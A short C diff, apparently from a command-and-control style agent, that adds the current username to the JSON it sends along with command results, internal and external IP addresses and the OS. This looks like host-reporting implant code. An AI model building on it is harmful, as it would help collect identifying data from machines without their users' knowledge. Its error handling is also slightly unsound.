@@ -304,13 +304,25 @@ void agent_send_now(HeapStore *heapStorePointer, const char *input)
         return;
     }
 
+    // char *user = "placeholder_username";
+    char *user = get_current_username(heapStorePointer);
+    OutboundJsonData->user = strdup(user);
+    if (!OutboundJsonData->user)
+    {
+        DEBUG_LOG("Memory allocation failed for user.\n");
+        free(OutboundJsonData->user);
+        free(OutboundJsonData);
+        return;
+    }
+
     // Encode JSON using the agent_id, command_result_data, and generated uuid as command_id.
     char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
                                               OutboundJsonData->command_result_data,
                                               uuid,
                                               OutboundJsonData->int_ip,
                                               OutboundJsonData->ext_ip,
-                                              OutboundJsonData->os);
+                                              OutboundJsonData->os,
+                                              OutboundJsonData->user);
     if (!encoded_json_response)
     {
         DEBUG_LOG("Failed to encode JSON response.\n");
